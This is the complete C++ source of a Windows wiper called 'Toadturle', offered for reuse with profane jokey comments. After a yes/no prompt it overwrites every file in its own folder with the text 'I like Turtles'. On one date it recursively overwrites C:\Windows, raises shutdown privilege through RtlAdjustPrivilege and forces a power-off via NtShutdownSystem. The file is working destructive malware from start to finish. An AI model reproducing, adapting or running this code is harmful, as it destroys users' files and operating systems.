#include <windows.h>
#include <winreg.h>
#include <winnt.h>
#include <winbase.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include <Lmcons.h>
#include <string>

// for greedy linker compiler
#pragma comment(lib, "Shlwapi.lib")

using namespace std;

// I like Turtles - EmmyMalaware's code, 2025
// Toadturle has a bunch a comments
// Holy shit

// NtShutdownSystem shit
typedef enum _SHUTDOWN_ACTION {
	ShutdownNoReboot = 0,
	ShutdownReboot = 1,
	ShutdownPowerOff = 2,
    ShutdownRestartApps = 3
} SHUTDOWN_ACTION;

typedef NTSTATUS(WINAPI* NtShutdownSystemFn)(SHUTDOWN_ACTION);
typedef NTSTATUS(WINAPI* RtlAdjustPrivilegeFn)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
// done wif it


// If you are looking at the source code, hi. Beware of a freight train of comments!
// For compatitiblity notes, and how the code works.

/*
* Toadturle by EmmyMalware, 2025
* It is a old relic of malware that destroys files
* You may use this source code, but credit me! 
* I'm desprate for a shoutout! Made for WinVista-Win11
* I fuckin hate 9x devlopment!
*/

/* I was going to make it Unicode, but I fucking hate wWinMain
* ApiEntry helps for Vista, i guess
* Make sure to run the specifed EXE for your system (Toadturle x86.exe, Toadturle x64.exe)
* It will not work cross-platform! C++ is very picky about the processer type you run it on.
*/

// KeyWrote is a thing I made for the RegOps results
int keywrote = 0;

// file voidz
void OverwriteFile(const char* filePath) {
	HANDLE hOFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOFile != INVALID_HANDLE_VALUE) {
		DWORD write;
		const char* data = "I like Turtles"; // hardcoded string
		WriteFile(hOFile, data, (DWORD)strlen(data), &write, NULL);
		CloseHandle(hOFile);
	}
}

void ProcessOverwrittenDir(const char* overwriteDirPath) 
{
	WIN32_FIND_DATAA wfd;
	char search[MAX_PATH];
	sprintf_s(search, "%s\\*", overwriteDirPath);

	HANDLE hDFind = FindFirstFileA(search, &wfd);
	if (hDFind == INVALID_HANDLE_VALUE)
		return;

	do {
		if (strcmp(wfd.cFileName, ".") == 0 || strcmp(wfd.cFileName, "..") == 0)
			continue;

		char fullP[MAX_PATH];
		sprintf_s(fullP, "%s\\%s", overwriteDirPath, wfd.cFileName);

		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			ProcessOverwrittenDir(fullP);
		}
		else
		{
			OverwriteFile(fullP);
		}
	} while (FindNextFileA(hDFind, &wfd));
}

// nt void for shutting down pc after some milisecs
void NtShutdownSecs(int secz) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		MessageBoxA(NULL, "ntdll.dll not found.", "Toadturle NT Error", MB_OK | MB_ICONERROR);
	}

	RtlAdjustPrivilegeFn RtlAdjustPrivilege = (RtlAdjustPrivilegeFn)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	NtShutdownSystemFn NtShutdownSystem = (NtShutdownSystemFn)GetProcAddress(hNtdll, "NtShutdownSystem");

	if (!RtlAdjustPrivilege || !NtShutdownSystem)
	{
		MessageBoxA(NULL, "Required NT functions not found.", "Toadturle NT Error", MB_OK | MB_ICONERROR);
	}

	BOOLEAN bOld = FALSE;
	NTSTATUS status = RtlAdjustPrivilege(19, TRUE, TRUE, &bOld);

	if (status != 0)
	{
		MessageBoxA(NULL, "Could not raise to shutdown privilege.", "Toadturle NT Error", MB_OK | MB_ICONERROR);
	}

	Sleep(secz);



	NtShutdownSystem(ShutdownPowerOff);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
	// reg check shit
	HKEY HKey;
	LPCSTR KeyPath = "Toadturle\\InfectedUser";
	LONG KeyResult = RegCreateKeyExA(HKEY_CURRENT_USER, KeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &HKey, NULL);
	LONG ToadturleInfCheck = RegOpenKeyExA(HKEY_CURRENT_USER, KeyPath, 0, KEY_READ, &HKey);

	// check if the key exists, if it doesn't create it
	if (ToadturleInfCheck == ERROR_SUCCESS) {
		RegCloseKey(HKey);
	}

	else if (ToadturleInfCheck == ERROR_FILE_NOT_FOUND) 
	{
		if (RegCreateKeyExA(HKEY_CURRENT_USER, KeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &HKey, NULL))
		{
			keywrote = 1;
			RegCloseKey(HKey);
		}
		else {
			MessageBoxA(NULL, "Could not create key! Aborting...", "Toadturle", MB_OKCANCEL | MB_ICONERROR);
		}
	}

	// define main virus stuff
	// *** USER STUFF ***
	char user[UNLEN + 1];
	DWORD userlen = UNLEN + 1;
	// *** DATE STUFF ***
	SYSTEMTIME SysTime;
	// *** OTHER SHIT ***
	char ExePath[MAX_PATH];
	char search[MAX_PATH];
	WIN32_FIND_DATAA winfda;

	if (GetUserNameA(user, &userlen))
	{
		// Combine the message + user 4 dramatic effect!
		string msg = "You have to take full permission for what this does, ";
		msg += user;
		if (MessageBoxA(NULL, msg.c_str(), "Toadturle", MB_YESNO | MB_ICONWARNING) == IDYES) {
			// Toadturle is now effect on your system, overwriting random files.
			// It will now create a key and make it 1

			if (KeyResult == ERROR_SUCCESS)
			{
				keywrote = 1;
				// continue program, keywrote retuned 1;
				GetLocalTime(&SysTime);
				// Now infect all files in the current dir

				if (SysTime.wMonth == 9 && SysTime.wDay == 12)
				{
					// This is my birth day!
					MessageBoxA(NULL, "Today is my birthday, your PC is about to die\r\n>>Time for a reinstall...<<", "Emmy's Birthday", MB_ABORTRETRYIGNORE | MB_ICONINFORMATION);
					// Now it will destory all file in the windows dir
					ProcessOverwrittenDir("C:\\Windows");
					NtShutdownSecs(60000);
				}
				else
				{
					// It will now infect every file in the current directory with a file with the og file name saying "I like Turtles" inside
					GetModuleFileNameA(NULL, ExePath, MAX_PATH);
					PathRemoveFileSpecA(ExePath);

					wsprintfA(search, "%s\\*.*", ExePath);

					// SECRET COMMENT: INCREMENT MY BUTT
					HANDLE hFind = FindFirstFileA(search, &winfda);
					if (hFind == INVALID_HANDLE_VALUE) {
						MessageBoxA(NULL, "Could not find any files :(", "Toadturle", MB_OK | MB_ICONERROR);
					}

					do {
						if (!(winfda.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
						{
							// build full file path
							char FullFPath[MAX_PATH];
							wsprintfA(FullFPath, "%s\\%s", ExePath, winfda.cFileName);

							// createalways overwrites
							HANDLE hFile = CreateFileA(FullFPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
							if (hFile != INVALID_HANDLE_VALUE)
							{
								const char turtles[] = "I like Turtles";
								DWORD bytesWritten;
								WriteFile(hFile, turtles, sizeof(turtles) - 1, &bytesWritten, NULL);
								CloseHandle(hFile);
							}
						}
					} while (FindNextFileA(hFind, &winfda));
				}
			}
			else 
			{
				MessageBoxA(NULL, "Could not create key! Aborting...", "Toadturle", MB_OKCANCEL | MB_ICONERROR);
			}

			// continue code, nah
		}
		else
		{
			MessageBoxA(NULL, "I let you win for today, I'll be back when you execute me again!", "Toadturtle", MB_OK | MB_ICONINFORMATION);
			exit(0);
		}
	} 
	else 
	{
		MessageBoxA(NULL, "You're too powerful for Toadturle, guess I'm a failure :(\r\nReason: Can't get a username from GetUserNameA!", "Toadturle is not powerful :(", MB_OK | MB_ICONERROR);
		exit(0);
	}
}
